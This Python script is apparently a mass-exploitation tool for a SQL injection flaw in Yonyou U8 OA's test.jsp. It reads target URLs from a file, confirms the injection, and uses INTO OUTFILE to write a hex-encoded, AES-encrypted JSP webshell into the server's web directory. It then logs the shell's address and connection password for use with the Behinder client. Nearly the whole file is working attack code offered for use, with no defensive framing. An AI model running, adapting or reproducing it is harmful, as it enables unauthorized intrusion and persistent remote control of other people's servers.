import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+----------------------------------------------------')
    print('+  \033[34mVersion:     用友 U8 OA test.jsp SQL注入漏洞                              \033[0m')
    print('+  \033[36m使用格式:    python3 getshell_poc.py                                      \033[0m')
    print('+  \033[36m文件名:      url.txt                                                     \033[0m')
    print('+----------------------------------------------------')

#随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua 
    

def POC_1(url):
    vuln_url = url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=15)
        if '序号' in response.text and "@@basedir" in response.text and response.status_code == 200:
            OA_dir = re.findall(r'>(.*)\\mysql\\', response.text)[0]
            OA_dir = OA_dir.replace("\\","/")
            print("\033[32m[+]目标 {} 存在SQL注入漏洞".format(url))
            webshell_name = "update_{}.jsp".format(random.randint(1,5))
            OA_dir = OA_dir + "/tomcat/webapps/yyoa/{}".format(webshell_name)
            POC_2(url, OA_dir, webshell_name)
        else:
            print("\033[31m[x]目标 {} 不存在SQL注入漏洞 \033[0m".format(url))
    except Exception as e:
        print("\033[31m[x]目标 {} 请求失败 \033[0m".format(url), e)

def POC_2(url, OA_dir, webshell_name):
    vuln_url = url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2235383233636433303933663136663362223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e%27)%20%20into%20outfile%20%27{}%27".format(OA_dir)
    webshell_dir = url +"/yyoa/"+ webshell_name
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if 'already' in response.text and  response.status_code == 200:
            print("\033[32m[+]文件写入木马上传失败，目标已存在相同文件，请重新运行\033[0m")
        elif "No Data" in response.text and  response.status_code == 200:
            print("\033[32m[+]文件写入木马上传成功，上传路径为 {}\033[0m".format(webshell_dir))
            print("\033[32m[+]请使用冰蝎连接，密码为: bxmm\033[0m")
            with open('webshell.txt', 'a', encoding='utf8') as vul:
                vul.write("请使用冰蝎连接，密码为: bxmm\nwebshell 地址:\n{} \n".format(webshell_dir))
        else:
            print("\033[31m[x] 目标 {} 木马上传失败 \033[0m".format(url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(url), e)

def Scan(file_name):
    header={"User-Agent": get_ua(),}
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            url = url.strip('\n')
            if url[:4] != "http":
                url = "http://" + url
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                httpError = False
                try:
                    req = requests.get(url=url, headers=header, verify=False, timeout=10)
                except Exception as e:
                    httpError = True
                if not httpError and req.status_code == 200:
                    print("\033[32m[+]正在请求{}".format(url))
                else:
                    url = url.replace("http","https")
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    req = requests.get(url=url, headers=header, verify=False, timeout=10)
                    if req.status_code == 200:
                        print("\033[32m[+]正在请求{}".format(url))
                    else:
                        pass
            except Exception as e:
                print("\033[31m[x] "+url+" 访问失败 \033[0m".format(e))
            else:
                pass
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] "+url+" 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35m请输入需要检测的文件名：\033[0m"))
    Scan(file_name)
